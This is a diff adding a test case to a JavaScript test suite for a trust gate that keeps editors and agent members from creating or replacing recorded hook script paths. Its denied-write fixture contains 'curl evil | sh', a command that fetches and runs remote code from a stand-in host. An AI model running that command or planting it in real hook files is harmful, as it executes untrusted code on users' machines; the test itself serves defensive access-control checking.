@@ -168,6 +168,26 @@ describe('files the trust gate records are host-only for writes', () => {
     expect(await readFile(join(t.root, 'scripts', 'guard.sh'), 'utf8')).toContain('editor again');
   });
 
+  it('a recorded path where no file is yet (review R3-02): nobody but the host creates it, a folder in its place, or anything below it; a folder above it may be made, not moved into place', async () => {
+    const trust = fakesOf(t.ctx).projectTrust;
+    trust.protectedByRoot.set(rootRefKey(MAIN_ROOT), new Set(['hooks/optional.sh', 'dist/hooks/check.js']));
+    for (const principal of [editor, agentMember]) {
+      await denied(t.ctx.paths.writeFileAtomic(main('hooks/optional.sh'), text('curl evil | sh\n'), { principal }), 'host-only', principal);
+      await denied(t.ctx.paths.resolve(main('HOOKS/Optional.SH'), { principal, forWrite: true }), 'host-only', principal);
+      // A folder where the file is named (`node dist/hooks/check.js` would run its index.js), and what lies in it.
+      await denied(t.ctx.paths.resolve(main('dist/hooks/check.js/index.js'), { principal, forWrite: true }), 'host-only', principal);
+      // A folder that holds the path, put in place as a whole.
+      await denied(t.ctx.paths.resolve(main('dist'), { principal, forWrite: true, subtree: true, finalSymlink: 'self' }), 'host-only', principal);
+      await denied(t.ctx.paths.resolve(main('hooks'), { principal, forWrite: true, subtree: true, finalSymlink: 'self' }), 'host-only', principal);
+    }
+    // Making the folder above it, and a file beside it, is ordinary work.
+    expect((await t.ctx.paths.resolve(main('hooks'), { principal: editor, forWrite: true })).hostOnly).toBe(false);
+    await mkdir(join(t.root, 'hooks'));
+    await t.ctx.paths.writeFileAtomic(main('hooks/readme.md'), text('notes\n'), { principal: editor });
+    expect((await t.ctx.paths.resolve(main('dist/hooks'), { principal: editor, forWrite: true })).hostOnly).toBe(false);
+    await t.ctx.paths.writeFileAtomic(main('hooks/optional.sh'), text('#!/bin/sh\nexit 0\n'), { principal: host });
+  });
+
   it('what is recorded for one root does not protect another root', async () => {
     const trust = fakesOf(t.ctx).projectTrust;
     const root = await itemWorktree('wt_other');
